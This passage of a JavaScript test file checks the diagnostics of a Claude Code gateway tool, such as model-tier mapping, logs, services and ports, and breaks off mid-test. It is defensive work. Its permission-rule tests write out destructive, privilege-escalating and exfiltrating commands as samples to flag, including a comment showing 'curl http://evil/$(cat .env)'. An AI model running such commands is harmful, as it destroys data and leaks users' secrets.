import test from 'node:test';
import assert from 'node:assert/strict';
import {
  LOG_ROTATE_THRESHOLD_BYTES,
  UPLOADS_FOOTPRINT_WARN_BYTES,
  classifyAuthToken,
  classifyDeviceGateTopology,
  classifyPermissionRule,
  claudeConfigDirDiagnostic,
  computeReadiness,
  configFormatDiagnostic,
  identifySelfServer,
  envOverrideDiagnostic,
  hooksBridgeDiagnostic,
  logSwitchDiagnostic,
  modelSettingsConflictDiagnostic,
  portOccupancyDiagnostic,
  resolveServicePortOwner,
  serviceUnitsDiagnostic,
  statuslineBridgeDiagnostic,
  statuslineConfigDiagnostic,
  summarizeDangerous,
  uploadsFootprintDiagnostic,
} from '../../src/ops/doctor-checks.js';

// 判据依据（2026-08-04 用本地假网关抓 /v1/messages 请求体实测，CLI 2.1.221）：
//   全局 sonnet + 目录映射 SONNET      → 发出 grok-4.5      （映射生效）
//   全局 sonnet + 目录只映射 OPUS      → 发出 claude-sonnet-5（退回官方全名，网关不认）
//   全局 claude-opus-5 + 全套映射      → 发出 claude-opus-5  （全名绕过映射）
//   全局不设 model + 全套映射          → 发出 glm-5.2        （CLI 自选档位，映射生效）
// ⇒ 决定映射是否命中的是「model 解析出的档位是否在该目录被映射」，不是 model 字符串是否等于映射目标。
const dirOf = (dir, tierTargets, extra = {}) => ({ dir, localModel: '', projectModel: '', tierTargets, ...extra });
const GW = { sonnet: 'grok-4.5', opus: 'glm-5.2', haiku: 'mimo-v2.5' };

test('modelSettingsConflictDiagnostic: 全局 model 是档位别名且该档位已映射 → ok（不得误报）', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'sonnet',
    dirs: [dirOf('/w/gh-pages', GW)],
  });
  assert.equal(r.status, 'ok');
});

test('modelSettingsConflictDiagnostic: 别名带 [1m] 后缀仍按档位解析 → ok', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'opus[1m]',
    dirs: [dirOf('/w/gh-pages', GW)],
  });
  assert.equal(r.status, 'ok');
});

test('modelSettingsConflictDiagnostic: 全局 model 是全名 → warn，且点名出问题的目录', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    dirs: [dirOf('/w/gh-pages', GW)],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /claude-fable-5/);
  assert.match(r.detail, /gh-pages/);
});

test('modelSettingsConflictDiagnostic: 别名档位在该目录未映射 → warn（会退回官方全名）', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'sonnet',
    dirs: [dirOf('/w/only-opus', { opus: 'glm-5.2' })],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /only-opus/);
  // 必须判成「档位缺映射」而非「全名绕过」：两种 warn 的修法不同（补映射 vs 改 model），
  // 且只断言 detail 含 "sonnet" 会被「全名」文案一并满足 —— 变异检查 M3 实测到的空过。
  assert.match(r.detail, /档位 sonnet/);
  assert.ok(!/全名，不走档位映射表/.test(r.detail), 'sonnet 是别名，不该被判成模型全名');
});

test('modelSettingsConflictDiagnostic: opusplan 需 opus+sonnet 两档，缺一即 warn', () => {
  assert.equal(modelSettingsConflictDiagnostic({
    userModel: 'opusplan',
    dirs: [dirOf('/w/both', { opus: 'glm-5.2', sonnet: 'grok-4.5' })],
  }).status, 'ok');
  const r = modelSettingsConflictDiagnostic({
    userModel: 'opusplan',
    dirs: [dirOf('/w/only-opus', { opus: 'glm-5.2' })],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /档位 sonnet/);
});

test('modelSettingsConflictDiagnostic: 混合目录下，无网关映射的目录不被连坐点名', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    dirs: [dirOf('/w/official-no-gateway', {}), dirOf('/w/has-gateway', GW)],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /has-gateway/);
  assert.ok(!/official-no-gateway/.test(r.detail), '无映射的目录用全名完全合法，不该被点名');
});

test('modelSettingsConflictDiagnostic: 多目录只点名真冲突的那个，自洽目录不连坐', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'sonnet',
    dirs: [dirOf('/w/good', GW), dirOf('/w/bad', { opus: 'glm-5.2' })],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /bad/);
  assert.ok(!/good/.test(r.detail), '自洽目录不该出现在告警里');
});

test('modelSettingsConflictDiagnostic: 目录 local 已 pin 网关模型全名 → ok（覆盖链清晰）', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    dirs: [dirOf('/w/gh-pages', GW, { localModel: 'grok-4.5' })],
  });
  assert.equal(r.status, 'ok');
});

test('modelSettingsConflictDiagnostic: 目录无任何 DEFAULT 映射 → ok（无网关，全名合法）', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    dirs: [dirOf('/w/official', {})],
  });
  assert.equal(r.status, 'ok');
  assert.equal(modelSettingsConflictDiagnostic({}).status, 'ok');
});

test('modelSettingsConflictDiagnostic: 未设 model 时主档位齐全 → ok，缺档 → warn', () => {
  assert.equal(modelSettingsConflictDiagnostic({ userModel: '', dirs: [dirOf('/w/full', GW)] }).status, 'ok');
  const r = modelSettingsConflictDiagnostic({ userModel: '', dirs: [dirOf('/w/partial', { sonnet: 'grok-4.5' })] });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /partial/);
});

test('statuslineConfigDiagnostic treats web statusline as self-contained', () => {
  const result = statuslineConfigDiagnostic();

  assert.equal(result.status, 'ok');
  assert.match(result.detail, /SDK/);
  assert.doesNotMatch(result.detail, /settings\.json/);
  assert.doesNotMatch(result.detail, /E16.*禁用/);
});

test('statuslineConfigDiagnostic：实际读取 off 状态，不再是恒定装饰性检查（code-review P2）', () => {
  const enabled = statuslineConfigDiagnostic(false);
  assert.equal(enabled.status, 'ok');
  assert.match(enabled.detail, /SDK/); // 与默认调用一致：启用态

  const off = statuslineConfigDiagnostic(true);
  assert.equal(off.status, 'ok'); // WEB_STATUSLINE=off 是合法配置，不是风险，仍 ok
  assert.match(off.detail, /已.*关闭|off/i);
  assert.notEqual(off.detail, enabled.detail, '开/关两态的 detail 文案应不同，证明确实读取了状态');
});

test('statuslineBridgeDiagnostic：区分已安装、未安装与用户改写后的 drift', () => {
  assert.equal(statuslineBridgeDiagnostic({ installState: 'installed' }).status, 'ok');
  assert.match(statuslineBridgeDiagnostic({ installState: 'installed' }).detail, /CLI.*同步/);
  assert.equal(statuslineBridgeDiagnostic({ installState: 'not-installed' }).status, 'warn');
  assert.match(statuslineBridgeDiagnostic({ installState: 'not-installed' }).detail, /statusline:install/);
  assert.equal(statuslineBridgeDiagnostic({ installState: 'drifted' }).status, 'warn');
  assert.match(statuslineBridgeDiagnostic({ installState: 'drifted' }).detail, /改写|漂移/);
  assert.equal(statuslineBridgeDiagnostic({ webOff: true, installState: 'not-installed' }).status, 'ok');
  assert.equal(statuslineBridgeDiagnostic({ bridgeOff: true, installState: 'not-installed' }).status, 'ok');
});

// ④ 安全体检核心：危险白名单判定 —— 公网暴露前审查 permissions.allow 里哪些规则过宽。
test.describe('classifyPermissionRule：危险规则判定', () => {
  const sev = r => classifyPermissionRule(r).severity;
  test('无限定 Bash → danger（等于放开 shell）', () => {
    assert.equal(sev('Bash'), 'danger');
    assert.equal(sev('Bash(*)'), 'danger');
    assert.equal(sev('Bash(:*)'), 'danger');
  });
  test('破坏性 / 提权命令 → danger', () => {
    assert.equal(sev('Bash(sudo apt*)'), 'danger');
    assert.equal(sev('Bash(rm -rf /*)'), 'danger');
    assert.equal(sev('Bash(chmod 777*)'), 'danger');
  });
  test('外联 / 外泄命令 → danger', () => {
    assert.equal(sev('Bash(curl*)'), 'danger');
    assert.equal(sev('Bash(wget http*)'), 'danger');
    assert.equal(sev('Bash(ssh*)'), 'danger');
  });
  test('裸写类工具（无路径限定）→ danger', () => {
    assert.equal(sev('Write'), 'danger');
    assert.equal(sev('Edit'), 'danger');
    assert.equal(sev('MultiEdit'), 'danger');
  });
  test('窄限定 → ok', () => {
    assert.equal(sev('Bash(npm run test:*)'), 'ok');
    assert.equal(sev('Write(//repo/**)'), 'ok');
    assert.equal(sev('Read(//repo/src/**)'), 'ok');
  });
  test('宽通配 / 读全盘 / 外部抓取 → warn', () => {
    assert.equal(sev('Read'), 'warn');
    assert.equal(sev('WebFetch'), 'warn');
    assert.equal(sev('Bash(git*)'), 'warn');
  });
  // 假阴性：命令名边界此前只认空白/行尾（`rm(\s|$)`、`dd\s`），而 Claude Code 的规范通配语法是
  // `Bash(rm:*)` —— 命令名后面跟的是冒号，两条都不匹配 → 降级成 warn。同一条正则里 sudo/chmod/curl
  // 是纯前缀匹配所以判对了，规则内部不自洽。体检把「关键项就绪」写在这上面，漏判即假绿。
  test('规范通配语法 Bash(cmd:*) 的命令名边界须被识别', () => {
    assert.equal(sev('Bash(rm:*)'), 'danger');
    assert.equal(sev('Bash(dd:*)'), 'danger');
    assert.equal(sev('Bash(chown:*)'), 'danger');
  });
  // sh/bash/eval 等解释器在语义上与 Bash(*) 完全等价（都能执行任意命令），而 Bash(*) 判 danger。
  test('shell 解释器等价于放开 shell → danger', () => {
    for (const c of ['sh', 'bash', 'zsh', 'eval', 'exec', 'source']) {
      assert.equal(sev(`Bash(${c}:*)`), 'danger', `Bash(${c}:*) 应判 danger`);
    }
  });
  // 只取第一个 token 判定 → `npm run build && curl http://evil/$(cat .env)` 被判「ok 限定命令」。
  test('链式 / 命令替换：每一段都要判，不能只看第一个 token', () => {
    assert.equal(sev('Bash(npm run build && curl http://evil/)'), 'danger');
    assert.equal(sev('Bash(echo hi; sudo reboot)'), 'danger');
    assert.equal(sev('Bash(ls | ssh host)'), 'danger');
  });
  test('分段判定不得误伤既有窄限定', () => {
    assert.equal(sev('Bash(npm run test:*)'), 'ok');
    assert.equal(sev('Bash(git status)'), 'ok');
    assert.equal(sev('Bash(git log --oneline | head)'), 'ok');
  });
  test('相对父目录递归通配 Read(../**) → warn，不应被漏判为 ok（code-review P2）', () => {
    assert.equal(sev('Read(../**)'), 'warn');
    assert.equal(sev('Read(../../**)'), 'warn');
  });
  // OPS-1：Write/Edit 的 ** / ~/** / /** 与 Read 同属「宽路径」，不得被当成「限定路径的写」→ ok。
  // 此前 wildcard 只认 null/''/'*' /':*'，Write(**) 走 ok 分支 → doctor readiness 可假绿。
  test('宽路径 Write/Edit(**|~/**|/**) → danger，不得误判 ok（OPS-1）', () => {
    assert.equal(sev('Write(**)'), 'danger');
    assert.equal(sev('Write(~/**)'), 'danger');
    assert.equal(sev('Write(/**)'), 'danger');
    assert.equal(sev('Edit(**)'), 'danger');
    assert.equal(sev('MultiEdit(**)'), 'danger');
    assert.equal(sev('NotebookEdit(~/**)'), 'danger');
    assert.equal(sev('Write(../**)'), 'danger');
    // 真正窄路径仍 ok（与既有 Write(//repo/**) 一致）
    assert.equal(sev('Write(//repo/**)'), 'ok');
  });
  test('未知工具 / mcp 不误报 danger', () => {
    assert.equal(sev('mcp__server__tool'), 'ok');
    assert.notEqual(sev('SomeWeirdTool'), 'danger');
  });
  test('每条带 reason，且空/垃圾输入不抛', () => {
    assert.match(classifyPermissionRule('Bash(*)').reason, /.+/);
    assert.doesNotThrow(() => classifyPermissionRule(''));
    assert.doesNotThrow(() => classifyPermissionRule(null));
  });
});

test.describe('summarizeDangerous', () => {
  test('混合规则 → ruleCount 全量 + dangerous 仅危险条（带 rule/reason）', () => {
    const s = summarizeDangerous(['Bash(*)', 'Read', 'Write(//r/**)', 'Bash(curl*)']);
    assert.equal(s.ruleCount, 4);
    assert.equal(s.dangerous.length, 2);
    assert.ok(s.dangerous.every(d => d.rule && d.reason));
  });
  test('空白名单 → ruleCount 0, dangerous []', () => {
    assert.deepEqual(summarizeDangerous([]), { ruleCount: 0, dangerous: [] });
  });
});

test.describe('classifyAuthToken：绝不回显明文', () => {
  test('undefined → warn(isSet false)', () => {
    assert.deepEqual(classifyAuthToken(undefined), { status: 'warn', isSet: false });
  });
  test('空串 → fail', () => {
    assert.equal(classifyAuthToken('').status, 'fail');
  });
  test('短 token → warn，返回 length 但无明文', () => {
    const r = classifyAuthToken('abc');
    assert.equal(r.status, 'warn');
    assert.equal(r.length, 3);
    assert.equal(JSON.stringify(r).includes('abc'), false);
  });
  test('正常 token → ok，不回显明文', () => {
    const r = classifyAuthToken('x'.repeat(32));
    assert.equal(r.status, 'ok');
    assert.equal(JSON.stringify(r).includes('x'.repeat(32)), false);
  });
});

test.describe('computeReadiness：公网暴露就绪度', () => {
  const chk = (id, status, safe) => ({ id, status, safe });
  test('任一 fail → blocked', () => {
    assert.equal(computeReadiness([chk('CLAUDE_BIN', 'fail')]).level, 'blocked');
  });
  test('危险白名单 + 无 CF + 弱 token → blocked', () => {
    assert.equal(computeReadiness([
      chk('AUTH_TOKEN', 'warn'), chk('CF_ACCESS', 'ok', { enabled: false }),
      chk('WHITELIST', 'warn', { dangerous: [{ rule: 'Bash(*)' }] }),
    ]).level, 'blocked');
  });
  test('危险白名单 + 有 CF Access → caution（有兜底）', () => {
    assert.equal(computeReadiness([
      chk('AUTH_TOKEN', 'ok'), chk('CF_ACCESS', 'ok', { enabled: true }),
      chk('WHITELIST', 'warn', { dangerous: [{ rule: 'Bash(*)' }] }),
    ]).level, 'caution');
  });
  test('全净 → ready', () => {
    assert.equal(computeReadiness([chk('AUTH_TOKEN', 'ok'), chk('WHITELIST', 'ok', { dangerous: [] })]).level, 'ready');
  });
});

test.describe('classifyDeviceGateTopology（AUTH-003）', () => {
  test('CF Access 已开 → ok（设备门 bypass 为设计路径）', () => {
    const r = classifyDeviceGateTopology({ authTokenSet: true, cfEnabled: true });
    assert.equal(r.status, 'ok');
    assert.equal(r.safe.risk, 'none');
  });
  test('有 AUTH_TOKEN 无 CF Access → ok（Host 感知设备门，A2 不再误报 tunnel 跳过）', () => {
    const r = classifyDeviceGateTopology({ authTokenSet: true, cfEnabled: false });
    assert.equal(r.status, 'ok');
    assert.equal(r.safe.risk, 'none');
    assert.equal(r.safe.note, 'host_aware_device_gate');
    assert.match(r.detail, /设备门|CF Access/);
  });
  test('无 AUTH_TOKEN → ok（仅本机）', () => {
    const r = classifyDeviceGateTopology({ authTokenSet: false, cfEnabled: false });
    assert.equal(r.status, 'ok');
  });
});

// D12：hooks 桥安装态四分支。与 D6 同款——drifted 不自作主张覆盖，只提示用户自己看。
test('hooksBridgeDiagnostic：off / 已安装 / 漂移 / 未安装 四态', () => {
  assert.equal(hooksBridgeDiagnostic({ bridgeOff: true }).status, 'ok');
  assert.equal(hooksBridgeDiagnostic({ installState: 'installed' }).status, 'ok');
  const drifted = hooksBridgeDiagnostic({ installState: 'drifted' });
  assert.equal(drifted.status, 'warn');
  assert.match(drifted.detail, /勿强行覆盖/);
  const missing = hooksBridgeDiagnostic({ installState: 'not-installed' });
  assert.equal(missing.status, 'warn');
  assert.match(missing.detail, /hooks:install/);
});

// D17：配置格式可见性。核心断言是 legacy env 的 status 必须是 **ok 而非 warn**——
// .env 是长期受支持的一等路径（产品立场，见 doctor-checks.configFormatDiagnostic 头注），
// 这项检查的唯一目的是给 headless 旧用户一条主动发现迁移能力的路，不是催迁。
test('configFormatDiagnostic：config / env / none 三态，legacy 恒为 ok', () => {
  const unified = configFormatDiagnostic({ source: 'config' });
  assert.equal(unified.status, 'ok');
  assert.match(unified.detail, /ccm\.config\.json/);

  const legacy = configFormatDiagnostic({ source: 'env' });
  assert.equal(legacy.status, 'ok');
  assert.match(legacy.detail, /长期受支持/);
  assert.match(legacy.detail, /config\.js migrate/);

  const legacyEn = configFormatDiagnostic({ source: 'env', lang: 'en' });
  assert.equal(legacyEn.status, 'ok');
  assert.match(legacyEn.detail, /supported long-term/);
  assert.match(legacyEn.detail, /config\.js migrate/);

  const fresh = configFormatDiagnostic({ source: 'none' });
  assert.equal(fresh.status, 'ok');
  assert.match(fresh.detail, /setup\.js/);
});

// ★「配置坏了」与「还没配置」是两回事，此前被压成同一格：doctor 把解析失败映射成 source:'none'，
// 于是一个 server 根本起不来的文件被报成 ok「尚未配置（首次安装：…）」，doctor 还 exit 0。
// 桌面端「运行体检」和文档里的 agent recipe 都读这个退出码，看到的是一份干净的预检。
test('★ configFormatDiagnostic：解析失败必须是 fail，且不能伪装成「尚未配置」', () => {
  const broken = configFormatDiagnostic({ source: 'none', error: 'Unexpected token } in JSON at position 42' });
  assert.equal(broken.status, 'fail', 'server 起不来的配置不能报 ok');
  assert.doesNotMatch(broken.detail, /尚未配置|首次安装/, '别把「坏了」说成「还没配」——用户会去跑 setup 覆盖掉它');
  assert.match(broken.detail, /Unexpected token/, '要把解析器的原话带出来，否则用户不知道改哪一行');

  const brokenEn = configFormatDiagnostic({ source: 'none', error: 'bad json', lang: 'en' });
  assert.equal(brokenEn.status, 'fail');
  assert.doesNotMatch(brokenEn.detail, /Not configured yet/);
  assert.match(brokenEn.detail, /bad json/);
});

// ── 2026-08-04 code review：本次改动自身的两个洞（实测确认）────────────────────
// 洞一：resolveTiers 用 `TIER_ALIASES[bare]` 做计算属性查找，`constructor` / `__proto__`
// 经原型链返回真值非数组 → 下游 tiers.filter 抛 TypeError，冲出 runDoctor 打死整份体检报告
// （不是降级成一行 warn，是整个诊断面板挂掉）。
test('modelSettingsConflictDiagnostic: 原型链键名不得让整份体检崩掉', () => {
  for (const evil of ['constructor', '__proto__', 'toString', 'valueOf', 'hasOwnProperty']) {
    const r = modelSettingsConflictDiagnostic({
      userModel: evil,
      dirs: [dirOf('/w/gw', GW)],
    });
    assert.ok(r && typeof r.status === 'string', `model=${evil} 必须返回正常结果而非抛异常`);
    assert.equal(r.status, 'warn', `${evil} 不是档位别名，应按模型全名判 warn`);
  }
});

// ---- 日志开关长开检出 ----
// 事故实证（2026-08-04 复核）：~/Library/Logs/ccm-server.log.0.gz 解压 156,351,605 字节 = 149MiB，
// 归档时间 7/18，与 app.js:2661 注释「DEBUG_SDK_MESSAGES 长开曾把日志刷到 149M 而无任何界面可见」
// 对得上。当时唯一的可见性是事后翻磁盘——doctor 此前对三个日志开关零感知（grep LOG_ scripts/doctor.js
// 无命中）。
//
// 判据与服务状态面板对齐（logic.js serviceStatusBasicRows：只有 sdkDebug 开才 alert）：
// interactions/stderr 量级小得多，单独开着是正常调试态，不该每次体检都报 warn 制造噪音——
// 那样人会学会忽略它，检出就白做了（同 metrics.js recentDeliveryFailure 的「狼来了」考虑）。
// 但它们叠加「日志已经涨过轮转阈值」时仍要提醒：此时保留窗口正在被压缩。
const noLogFile = { interactions: false, sdkDebug: false, stderr: false, logFileBytes: 0 };

test('logSwitchDiagnostic: 三个开关全关 → ok', () => {
  const r = logSwitchDiagnostic(noLogFile);
  assert.equal(r.status, 'ok');
});

test('logSwitchDiagnostic: DEBUG_SDK_MESSAGES 开 → warn 且点名该开关（149M 事故元凶）', () => {
  const r = logSwitchDiagnostic({ ...noLogFile, sdkDebug: true });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /DEBUG_SDK_MESSAGES/);
});

// 防「文案写死」空过：实现若不分开关种类、恒回同一串，本条会红。
test('logSwitchDiagnostic: 仅 LOG_STDERR 开且日志未超阈值 → ok，且不得点名 DEBUG_SDK_MESSAGES', () => {
  const r = logSwitchDiagnostic({ ...noLogFile, stderr: true });
  assert.equal(r.status, 'ok');
  assert.match(r.detail, /LOG_STDERR/);
  assert.doesNotMatch(r.detail, /DEBUG_SDK_MESSAGES/);
});

// 防「大小分支空过」：实现若忽略 logFileBytes，本条会红。
test('logSwitchDiagnostic: 仅 LOG_STDERR 开但日志已超轮转阈值 → 升级为 warn 且带出实际体积', () => {
  const r = logSwitchDiagnostic({ ...noLogFile, stderr: true, logFileBytes: LOG_ROTATE_THRESHOLD_BYTES + 1 });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /\d+\s*MB/);
});

// 两个 warn 分支（sdkDebug / oversized）的 detail 都含开关名与体积，只断言这两项会被另一分支
// 误满足——首轮变异检查实测：把 `if (sdkDebug)` 改成 `if (false)` 时本条仍绿（落到 oversized 分支
// 照样通过）。故必须再断言一句 sdkDebug 分支【独有】的收尾指引，才真正钉住走的是哪条分支。
test('logSwitchDiagnostic: sdkDebug 开且日志超阈值 → 走 sdkDebug 分支，开关名与体积同时出现', () => {
  const r = logSwitchDiagnostic({ ...noLogFile, sdkDebug: true, logFileBytes: 200 * 1024 * 1024 });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /DEBUG_SDK_MESSAGES/);
  assert.match(r.detail, /200\s*MB/);
  assert.match(r.detail, /调试完请/, 'sdkDebug 分支独有文案；缺了说明落到了 oversized 分支');
});

// 日志文件读不到（未配置 LOG_FILE / 前台跑 / 权限不足）时，体检不得因此崩或误报体积。
test('logSwitchDiagnostic: logFileBytes 缺省 → 按「未超阈值」处理，不出现体积文案', () => {
  const r = logSwitchDiagnostic({ interactions: true, sdkDebug: false, stderr: false });
  assert.equal(r.status, 'ok');
  assert.match(r.detail, /LOG_INTERACTIONS/);
  assert.doesNotMatch(r.detail, /MB/);
});

// R9-uploads（2026-08-06 BUG hunting review）：只报可见性，【不自动清理】。
// .ccm-uploads/ 落在机主真实工作目录里，且历史消息回显要读它（附件预览走 browse:read）——
// 按 TTL/容量删会让老对话的图片预览全坏掉。要做对只有「识别 transcript 已引用不到的孤儿」一条路，
// 复杂度与风险不匹配实测增长率（22 天 2.5MB）。故只给体积可见性，清不清由机主判断。
test.describe('uploadsFootprintDiagnostic（R9：附件目录可见性，不自动删）', () => {
  test('无附件目录 → ok 且不啰嗦', () => {
    const r = uploadsFootprintDiagnostic({ dirs: [] });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /无附件/);
  });

  test('体积在阈值内 → ok，报总量供参照', () => {
    const r = uploadsFootprintDiagnostic({ dirs: [{ cwd: '/repo', bytes: 5 * 1024 * 1024, files: 12 }] });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /5 MB|12/);
  });

  test('超阈值 → warn，且明说不会自动清理、要机主自己删', () => {
    const r = uploadsFootprintDiagnostic({
      dirs: [{ cwd: '/repo', bytes: UPLOADS_FOOTPRINT_WARN_BYTES + 1, files: 400 }],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /不会自动清理|手动/);
  });

  test('多目录合计判阈值，detail 里点名最大的那个', () => {
    const half = Math.ceil(UPLOADS_FOOTPRINT_WARN_BYTES / 2) + 1;
    const r = uploadsFootprintDiagnostic({
      dirs: [{ cwd: '/small', bytes: 1024, files: 1 }, { cwd: '/big', bytes: half * 2, files: 300 }],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /\/big/);
  });

  test('不回显完整路径以外的内容，也不因单目录为 0 而误报', () => {
    const r = uploadsFootprintDiagnostic({ dirs: [{ cwd: '/repo', bytes: 0, files: 0 }] });
    assert.equal(r.status, 'ok');
  });
});

// ── claudeConfigDirDiagnostic ─────────────────────────────────────────────
// CLI/SDK 都认 CLAUDE_CONFIG_DIR（SDK 实测：projects 根 = (CLAUDE_CONFIG_DIR ?? ~/.claude)/projects），
// 本仓 history.js 的 CLAUDE_DIR 却硬编码 homedir()。设了它 = CLI 把 transcript 落到别处、本仓去老地方找，
// 而失败形态是「读不到 = 当作没有会话」，静默到无法自查。这里只把它变成启动时说得清的告警。
test.describe('claudeConfigDirDiagnostic', () => {
  test('未设置 → ok', () => {
    assert.equal(claudeConfigDirDiagnostic({ configDir: '' }).status, 'ok');
    assert.equal(claudeConfigDirDiagnostic({}).status, 'ok');
    assert.equal(claudeConfigDirDiagnostic().status, 'ok');
  });

  test('只有空白字符 → 视同未设置', () => {
    assert.equal(claudeConfigDirDiagnostic({ configDir: '   ' }).status, 'ok');
  });

  test('设置了 → warn，点名变量值与「读不到历史」这一具体后果', () => {
    const r = claudeConfigDirDiagnostic({ configDir: '/custom/claude-home' });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /CLAUDE_CONFIG_DIR/);
    assert.match(r.detail, /\/custom\/claude-home/, '要回显实际值，否则排障时不知道是谁设的');
    assert.match(r.detail, /历史|会话|transcript/);
  });
});

// ── D16：LaunchAgent 安装态 ───────────────────────────────────────────────
// 判据只消费 scripts/service.js status --json 的 ownership/state/drift 三个字段，
// **绝不回显 plistPath 绝对路径**（doctor-runtime.js:3 的脱敏纪律）。
test.describe('serviceUnitsDiagnostic', () => {
  const server = (over = {}) => ({
    unit: 'server', label: 'com.ccm.server', known: true,
    ownership: 'managed', state: 'running', flapping: false, drift: [], ...over,
  });

  test('非 macOS → ok 并说明跳过原因（CI 与 Docker 都在 Linux 上，不能红）', () => {
    const r = serviceUnitsDiagnostic({ platform: 'linux', supported: false, units: [] });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /macOS/);
  });

  // 启动收敛成两条入口（headless npm start / macOS desktop）后，deployment.md 明说
  // 【本仓库不提供官方 systemd unit】。这句跳过说明此前写「Linux 请用 systemd，见
  // docs/deployment.md」，把用户支去找一份不存在的指南。同源的还有 scripts/service.js
  // 的降级警告——两处要一起对，只改一处就是留一半假指路。
  test('非 macOS 的跳过说明指向真实入口，中英两版都不指 systemd', () => {
    const zh = serviceUnitsDiagnostic({ platform: 'linux', supported: false, units: [] });
    const en = serviceUnitsDiagnostic({ platform: 'linux', supported: false, units: [], lang: 'en' });

    assert.match(zh.detail, /npm start/, 'headless 是全平台基线，指路要落在它上面');
    assert.doesNotMatch(zh.detail, /请用 systemd/);
    assert.match(en.detail, /npm start/);
    assert.doesNotMatch(en.detail, /use systemd/);
  });

  test('server 在跑且归属清晰 → ok', () => {
    const r = serviceUnitsDiagnostic({ platform: 'darwin', supported: true, units: [server()] });
    assert.equal(r.status, 'ok');
  });

  test('未安装 → warn 并给出安装命令（新用户最需要的一句）', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server({ state: 'not-installed', ownership: 'adoptable' })],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /service:install|未安装/);
  });

  // 「未安装」对 headless 用户不是缺陷——终端里 npm start 本来就不装 LaunchAgent。
  // 原文案只说「关掉终端 server 就停了、开机也不会自启」，读起来像少装了必需件。
  test('未安装的提示要说清 headless 用不着它，别把正当入口说成缺件', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server({ state: 'not-installed', ownership: 'adoptable' })],
    });
    assert.match(r.detail, /npm start|headless/, '要点明另一条入口本来就不需要它');
  });

  // 机主的隧道就是这个状态。只看 PID 会一直显绿灯，而它其实在反复崩溃重启。
  test('flapping → warn 并点名是哪个 unit', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server(), { unit: 'tunnel', label: 'com.ccm.tunnel', known: true, ownership: 'foreign', state: 'running', flapping: true, drift: [] }],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /com\.ccm\.tunnel/);
  });

  // ★ classifyState 的取值域是 4 个，早前只处理了 not-installed / crashed，
  // stopped 掉进末尾的 ok 分支，输出「运行中（共 0 个 unit 在跑）」—— 服务是停的却报绿，
  // 而且文案自相矛盾。这正是 D16 存在的理由所覆盖的场景之一。
  test('server stopped（plist 在盘上但没被加载）→ warn，且文案不能说「运行中」', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server({ state: 'stopped' })],
    });
    assert.equal(r.status, 'warn');
    assert.ok(!r.detail.includes('运行中'), `文案不能说运行中：${r.detail}`);
    assert.match(r.detail, /未运行|已停止|没在跑/);
  });

  test('server crashed → fail（装了却没在跑，是明确故障）', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server({ state: 'crashed' })],
    });
    assert.equal(r.status, 'fail');
  });

  test('配置漂移 → warn 并列出漂移维度', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server({ drift: ['repo-path'] })],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /repo-path/);
  });

  test('shape 漂移的 foreign unit 不算问题（自定义启动方式是有意配置，别年年报黄）', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server(), { unit: 'tunnel', label: 'com.ccm.tunnel', known: true, ownership: 'foreign', state: 'running', flapping: false, drift: ['shape'] }],
    });
    assert.equal(r.status, 'ok');
  });

  test('detail 里绝不出现 plist 绝对路径（脱敏纪律）', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server({ plistPath: '/Users/you/Library/LaunchAgents/com.ccm.server.plist', drift: ['repo-path'] })],
    });
    assert.ok(!r.detail.includes('/Users/you'), 'doctor 输出不回显绝对路径');
  });

  test('status --json 拿不到（service.js 挂了）→ warn 而非 fail，不阻断整份体检', () => {
    assert.equal(serviceUnitsDiagnostic({ platform: 'darwin', supported: true, units: null }).status, 'warn');
  });
});

// ── D4 修正：端口被自家常驻服务占用不是故障 ─────────────────────────────
// 旧实现无条件把「端口连得上」判成 fail，而常驻部署（文档主推的拓扑）下这是**恒红**的假警报。
test.describe('portOccupancyDiagnostic', () => {
  test('端口空闲 → ok', () => {
    assert.equal(portOccupancyDiagnostic({ port: 3000, occupied: false }).status, 'ok');
  });

  test('被自家 server unit 占用 → ok（这正是常驻部署的正常态）', () => {
    const r = portOccupancyDiagnostic({ port: 3000, occupied: true, ownerLabel: 'com.ccm.server' });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /com\.ccm\.server/);
  });

  test('被不明进程占用 → fail（真冲突，要提示怎么查）', () => {
    const r = portOccupancyDiagnostic({ port: 3000, occupied: true, ownerLabel: null });
    assert.equal(r.status, 'fail');
    assert.match(r.detail, /lsof|占用/);
  });

  test('端口号非法 → fail', () => {
